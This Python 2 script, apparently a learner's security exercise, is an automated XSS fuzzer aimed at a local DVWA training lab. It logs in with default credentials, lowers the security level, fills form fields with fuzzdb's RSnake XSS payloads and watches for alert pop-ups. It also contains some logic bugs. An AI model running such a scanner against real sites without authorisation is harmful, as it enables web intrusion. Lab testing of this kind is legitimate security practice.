# _*_coding:utf-8_*_

import traceback, time, re
from pywebfuzz import fuzzdb
from ghost import Ghost, TimeoutError
from bs4 import BeautifulSoup

page_timeout = 60
alert_timeout = 3
xss_rsnake = fuzzdb.attack_payloads.xss.xss_rsnake #调整向量个数


def dvwa_security(ghost, level):
    ghost.open('http://127.0.0.1/dvwa/')
    ghost.fill("form", {"username": 'admin', "password": 'password'})
    ghost.click('input[type=submit]', expect_loading=True)
    ghost.open('http://127.0.0.1/dvwa/security.php')
    ghost.evaluate("document.getElementsByName('security')[0].value = '%s';" % level)
    ghost.click('input[type=submit]', expect_loading=True)


def url_extract(url):
    url = url.split('?')
    paras = []
    if len(url) > 1:
        paras = url[1].split('&')
        for input, para in enumerate(paras):
            paras[input] = para.split('=')[0]
    return url[0], paras


def no_slash(url):
    if url[-1] == '/':
        url = url[:-1]
    return url


def standard(target_url, url):
    '''
    https://, //www., index.php
    /action,
    '''
    if url.startswith('//'):
        return 'http:' + url
    elif url.startswith('/') and len(url) > 2:
        return no_slash(target_url) + url
    else:
        return url


def base(url):
    s = re.search('\w+://[\w.]+/', url)
    if s:
        return s.group()
    else:
        return url


class Crawler():
    def __init__(self, target_url):
        self.max_depth = 0 #0为单页面
        self.ghost = Ghost(wait_timeout=page_timeout, display=True, download_images=False)
        dvwa_security(self.ghost, 'low')
        self.base_url = base(target_url)
        self.result = {target_url: []} #字典保存所有url及其参数
        self.__page_crawler(target_url, 0)

    def __add_url(self, all_url, url):
        pre_url, paras = url_extract(url)
        if pre_url not in self.result and pre_url.startswith(self.base_url):
            self.result[pre_url] = set(self.result) | set(paras)
            all_url.append(url)
            #print 'add', url

    def __page_crawler(self, target_url, depth):
        if depth > self.max_depth:
            return
        try:
            self.ghost.open(target_url)
            print 'open', depth, target_url
        except TimeoutError:
            print 'timeout'
            return

        all_url = [] #所有链接
        url_queue = [] #临时
        soup = BeautifulSoup(str(self.ghost.content), from_encoding='utf-8') #编码问题
        '''
        #获取点击事件
        self.ghost.wait_timeout = 8 #模拟点击时
        events = soup.find_all(onclick=True)
        for e in events:
            try:
                continue_flag = 0
                for k in ['return false;', 'logout']:
                    if e['onclick'].lower().find(k) != -1:
                        continue_flag = 1
                        break
                if continue_flag == 1:
                    continue
                if e['onclick'] not in url_queue:
                    url_queue.append(e['onclick'])
                    self.ghost.click(\'''*[onclick = "%s"]\''' % e['onclick'], expect_loading=True)
                    url, resources = self.ghost.evaluate('window.location.href')
                    if url != target_url:
                        self.__add_url(all_url, str(url))
                        self.ghost.open(target_url)
            except TimeoutError:
                print e['onclick'], 'no page loaded'
            except:
                print traceback.format_exc()
        self.ghost.wait_timeout = page_timeout

        #获取超链接
        array = soup.find_all('a')
        for a in array:
            try:
                continue_flag = 0
                url = standard(target_url, a['href'])
                for k in ['javascript:;', 'return false;', 'logout']:
                    if url.lower().find(k) != -1:
                        continue_flag = 1
                        break
                if continue_flag == 1:
                    continue
                if url.startswith('http'):
                    self.__add_url(all_url, url) #url
                elif url not in url_queue and not url.startswith('#'):
                    url_queue.append(url)
                    self.ghost.click(\'''a[href="%s"]\''' % url, expect_loading=True)
                    url, resources = self.ghost.evaluate('window.location.href')
                    if url != target_url:
                        self.__add_url(all_url, str(url))
                        self.ghost.open(target_url)
            except TimeoutError:
                print url, 'failed'
            except KeyError:
                pass
            except:
                print url, traceback.format_exc()
        '''
        #获取表单
        target_forms = []
        forms = soup.find_all('form')
        for input, form in enumerate(forms):
            names = []
            inputs = form.find_all('input', type=lambda type: type == 'text' or type == 'password'or not type)
            texts = form.find_all('textarea')
            for input in inputs:
                try:
                    names.append(input['name'])
                except KeyError:
                    pass
            for text in texts:
                try:
                    names.append(text['name'])
                except KeyError:
                    pass
            if len(names) > 0:
                target_forms.append((input, sorted(names)))
        print 'target', target_forms
        for input, names in target_forms:
            self.submit_xss(all_url, target_url, input, names) #表单序号及其所有输入框
            #深度优先
        for url in all_url:
            self.__page_crawler(url, depth + 1)

    def __del__(self):
        self.ghost.exit()

    def submit_xss(self, all_url, target_url, form_i, names):
        for input, xss in enumerate(xss_rsnake):
            print 'submit', names, xss
            try:
                if input > 0:
                    self.ghost.open(target_url)
                for name in names:
                    try:
                        self.ghost.evaluate(
                            "document.querySelectorAll('*[name=%s]')[0].removeAttribute('onfocus');" % name)
                        #填写表单
                        self.ghost.set_field_value("*[name=%s]" % name, xss)
                    except:
                        print traceback.format_exc()
                self.ghost.evaluate(
                    "document.querySelectorAll('input[type=submit]')[0].removeAttribute('onclick');")

                #提交表单 自动
                self.ghost.click('input[type=submit]')#, expect_loading=True)
                #self.ghost.evaluate(
                 #   "document.querySelectorAll('form')[%d]['submit']();" % form_i)#, expect_loading=True)

                try:
                    self.ghost.wait_timeout = alert_timeout
                    result, resources = self.ghost.wait_for_alert()
                    print '============================================================'
                    print 'alert:', result
                    print '============================================================'
                    if result == 'XSS':
                        break
                except TimeoutError:
                    pass
                finally:
                    self.ghost.wait_timeout = page_timeout
                    url, resources = self.ghost.evaluate('window.location.href')
                    self.__add_url(all_url, str(url))
            except TimeoutError:
                print 'failed'


if __name__ == '__main__':
    target_url = "http://127.0.0.1/dvwa/vulnerabilities/xss_r/"
    #记录时间
    start = time.clock()
    crawler = Crawler(target_url)
    print len(crawler.result), crawler.result
    end = time.clock()
    print 'time:', end - start
